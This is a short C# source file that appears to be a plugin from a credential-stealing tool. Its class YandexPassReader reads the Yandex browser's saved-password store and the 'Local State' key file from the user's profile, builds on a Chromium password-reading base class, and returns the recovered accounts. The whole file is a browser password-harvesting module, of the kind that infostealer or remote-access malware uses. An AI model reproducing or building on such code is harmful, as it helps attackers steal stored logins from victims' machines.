

using InvokedCommon.Models;
using System;
using System.Collections.Generic;
using System.IO;


namespace Plugin.Helper.Browsers
{
	public class YandexPassReader : ChromiumBase
	{
		public override string ApplicationName => "Yandex";

		public override IEnumerable<RecoveredAccount> ReadAccounts()
		{
			try
			{
				return (IEnumerable<RecoveredAccount>) this.ReadAccounts(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Yandex\\YandexBrowser\\User Data\\Default\\Ya Passman Data"), Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Yandex\\YandexBrowser\\User Data\\Local State"));
			}
			catch (Exception ex)
			{
				return (IEnumerable<RecoveredAccount>) new List<RecoveredAccount>();
			}
		}
	}
}
